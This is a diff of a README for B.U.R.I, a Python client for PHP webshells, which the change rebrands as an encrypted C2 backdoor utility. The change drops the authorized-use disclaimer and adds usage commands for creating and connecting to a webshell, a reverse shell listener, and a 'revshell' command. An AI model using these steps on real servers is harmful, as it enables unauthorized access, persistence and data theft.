@@ -1,128 +1,82 @@
-# B.U.R.I - Basic Universal Remote Interface
+# B.U.R.I v2.0 - Encrypted C2 Webshell Client
 
 <img width="563" height="729" alt="image" src="https://github.com/user-attachments/assets/fd44ac00-cf3f-46b1-be0e-a74669280599" />
 
-B.U.R.I (Basic Universal Remote Interface) is a **powerful, stateful, and user-friendly Python-based client** for interacting with PHP webshells. Designed for **penetration testers** and **security professionals**, B.U.R.I demonstrates the impact of file upload vulnerabilities and provides a rich command-line interface for managing remote servers.
 
----
+B.U.R.I (Backdoor Utility for Remote Interaction) is a modular, encrypted command-and-control (C2) webshell client designed for secure and interactive remote administration. It provides a feature-rich interface for managing remote systems via an encrypted PHP webshell, supporting AES-GCM encryption, reverse shell capabilities, and extensible command modules.
 
-## ✨ Features
+## Features
 
-- **Stateful `cd` Command**: Navigate the remote filesystem seamlessly, with the client tracking your current directory, just like a local terminal.
-- **Rich User Interface**: Built with `rich` and `prompt-toolkit` libraries for a modern, colorful, and interactive terminal experience with animations.
-- **Multi-Command Execution**: Execute multiple commands in a single line, separated by semicolons (`;`).
-- **System Reconnaissance**: Use the built-in `sysinfo` command to quickly gather critical information about the target system.
-- **Persistent Command History**: Commands are saved between sessions for easy recall.
-- **Secure Webshell Generation**: Generates an advanced, JSON-based PHP webshell that communicates over POST requests for increased discretion compared to GET-based shells.
+- **Encrypted Communication**: Uses AES-GCM for secure client-server communication.
+- **Interactive Shell**: Rich terminal UI with auto-completion, history, and syntax highlighting powered by `rich` and `prompt_toolkit`.
+- **Modular Design**: Extensible command modules for custom functionality (e.g., file upload/download, privilege escalation).
+- **Reverse Shell Support**: Built-in listener for reverse shell connections.
+- **Cross-Platform**: Supports both Linux and Windows targets with dynamic environment detection.
+- **Stealth Options**: Customizable POST parameters and proxy support for enhanced discretion.
+- **Path Autocompletion**: Remote path completion using `ls` for efficient navigation.
 
----
+## Installation
 
-## ⚙️ Installation
+### Prerequisites
+- Python 3.8+
+- Required Python packages:
+  ```bash
+  pip install requests rich prompt_toolkit pycryptodome
+  ```
 
-**From PyPI (Recommended – Now Available 🚀)**
-1. **You can now install B.U.R.I directly from PyPI**:
+### Setup
+1. Clone the repository:
    ```bash
-   pip install buri
+   git clone https://github.com/Anonre/Buri.git
+   cd Buri
    ```
-
-**From Source**
-1. **Clone the Repository**:
-   ```bash
-   git clone https://github.com/joelindra/buri.git
-   cd buri
-   ```
-
-3. **Install Dependencies**:
-   Ensure you have **Python 3.6+** installed, then install the required libraries:
+2. Install dependencies:
    ```bash
    pip install -r requirements.txt
    ```
+3. (Optional) Create a `modules` directory for custom command modules:
+   ```bash
+   mkdir modules
+   ```
 
----
+## Usage
 
-## 🚀 Usage
+B.U.R.I supports three main modes: creating a webshell, running an interactive session, and listening for reverse shells.
 
-B.U.R.I provides two primary commands: `create` and `run`.
-
-### 1. Creating the Webshell
-Generate a PHP webshell file to upload to the target server.
-
-**Command**:
+### 1. Create a Webshell
+Generate an encrypted PHP webshell:
 ```bash
-python buri.py create <file_path> --password <your_password>
+python buri.py create --path shell.php --password 'SuperSecretPass123'
+```
+This creates a PHP webshell at `shell.php` with the specified password for encryption.
+
+### 2. Run an Interactive Session
+Connect to a deployed webshell:
+```bash
+python buri.py run https://example.com/shell.php -p 'SuperSecretPass123' --param 'data'
+```
+- `--param`: Specify the POST parameter name (default: `data`).
+- `--proxy`: Optional proxy (e.g., `http://127.0.0.1:8080`).
+
+### 3. Start a Reverse Shell Listener
+Listen for incoming reverse shell connections:
+```bash
+python buri.py listen --lhost 0.0.0.0 --lport 4444
+```
+Then, from the interactive shell, initiate a reverse shell:
+```
+revshell <listener_ip> 4444
 ```
 
-**Example**:
-```bash
-python buri.py create shell.php --password mysecretpassword
-```
+### Example Commands
+Once in the interactive shell:
+- `whoami`: Display the current user.
+- `cd /path/to/dir`: Change the remote working directory.
+- `ls`: List files in the current directory (supports autocompletion).
+- `upload /local/path /remote/path`: Upload a file to the remote system.
+- `download /remote/path /local/path`: Download a file from the remote system.
+- `revshell <ip> <port>`: Initiate a reverse shell to the specified listener.
 
-### 2. Running the Interactive Shell
-Connect to the uploaded webshell using the `run` command to launch the interactive shell.
+### Screenshoot
 
-**Command**:
-```bash
-python buri.py run <url> --password <your_password>
-```
-
-**Example**:
-```bash
-python buri.py run https://example.com/uploads/shell.php --password mysecretpassword
-```
-
----
-
-## 🖥️ Client-Side Commands
-
-Once inside the interactive shell, use these special commands. Any other command is executed on the remote server.
-
-| Command | Description | Example |
-|---------|-------------|---------|
-| `sysinfo` | Displays detailed information about the remote system. | `root@example.com:/var/www$ sysinfo` |
-| `upload` | Uploads a file from your local machine to the remote server. | `root@example.com:/var/www$ upload /local/path/to/file.txt /remote/path/file.txt` |
-| `download` | Downloads a file from the remote server to your local machine. | `root@example.com:/var/www$ download /remote/path/config.php /local/path/to/save/config.php` |
-| `cd` | Changes the current working directory on the remote server. | `root@example.com:/var/www$ cd ../tmp` |
-| `clear` / `cls` | Clears the local terminal screen. | `root@example.com:/var/www$ clear` |
-| `help` | Displays the help menu for client-side commands. | `root@example.com:/var/www$ help` |
-| `exit` | Closes the webshell session. | `root@example.com:/var/www$ exit` |
-
----
-
-## ⚠️ Disclaimer
-
-**B.U.R.I is intended for educational purposes and authorized security testing only.** Using this tool to gain unauthorized access to computer systems is **illegal** and **unethical**. The author is not responsible for any misuse or damage caused by this program. Always ensure you have explicit permission to test systems.
-
----
-
-## 📜 License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please fork the repository, make your changes, and submit a pull request. For major changes, open an issue first to discuss your ideas.
-
-1. Fork the repository.
-2. Create a new branch (`git checkout -b feature-branch`).
-3. Commit your changes (`git commit -m 'Add new feature'`).
-4. Push to the branch (`git push origin feature-branch`).
-5. Open a pull request.
-
----
-
-## 📬 Contact
-
-For questions, suggestions, or issues, please open an issue on the [GitHub repository](https://github.com/joelindra/buri).
-
----
-
-## Screenshoot
-
-<img width="1863" height="893" alt="image" src="https://github.com/user-attachments/assets/2b37588b-ff71-452f-8f2c-e70a984f2a54" />
-
-<img width="1433" height="541" alt="image" src="https://github.com/user-attachments/assets/9acf1050-b271-4cf2-84ae-8dde1ebbfdf4" />
-
-<img width="1498" height="847" alt="image" src="https://github.com/user-attachments/assets/217799a1-b37c-4310-988b-358b82c4d81a" />
-
+<img width="1007" height="539" alt="image" src="https://github.com/user-attachments/assets/91932592-65bb-464a-b2d1-d36b2457cbda" />
